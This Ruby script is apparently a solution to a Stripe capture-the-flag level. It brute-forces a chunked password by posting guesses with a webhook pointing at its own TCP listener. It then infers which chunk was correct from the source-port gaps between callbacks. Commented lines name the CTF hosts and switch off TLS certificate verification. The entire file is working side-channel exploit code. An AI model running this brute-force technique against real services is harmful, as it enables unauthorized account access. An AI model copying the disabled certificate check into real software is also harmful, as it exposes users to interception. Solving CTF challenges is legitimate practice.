require 'net/http'
require 'net/https'
require 'socket'

port = 0
#host = "https://level08-4.stripe-ctf.com/user-bykvbccntg/"
#lvl2machine = "level02-2.stripe-ctf.com"
host = "http://127.0.0.1:3000"
lvl2machine = '127.0.0.1'
webhooks = []

chunks = [0, 0, 0, 0]

uri = URI.parse(host);
server = TCPServer.new(32000)

while true 
  password = "#{chunks[0].to_s.rjust(3, '0')}#{chunks[1].to_s.rjust(3, '0')}#{chunks[2].to_s.rjust(3, '0')}#{chunks[3].to_s.rjust(3, '0')}"
  body = "{\"password\": \"#{password}\", \"webhooks\": [\"#{lvl2machine}:#{server.addr[1]}\"]}"
  http = Net::HTTP.new(uri.host, uri.port)
  #http.use_ssl = true # needed for production system
  #http.verify_mode = OpenSSL::SSL::VERIFY_NONE # needed for production system
  req = Net::HTTP::Post.new(uri.request_uri)
  req.body = body
  begin
    response = http.request(req)
    client = server.accept
  rescue
    puts 'exception!'
    next
  end
  if port != 0
    diff = client.peeraddr[1] - port
    print "Password: #{password} - "
    p client.peeraddr
    index = diff - 3 # may need adjustment
    if [0,1,2,3].include? index
      chunks[index] += 1
    end
    if response.body.include?("true")
      puts 'BAM'
      return
    end
  end
  port = client.peeraddr[1]
  client.close
end
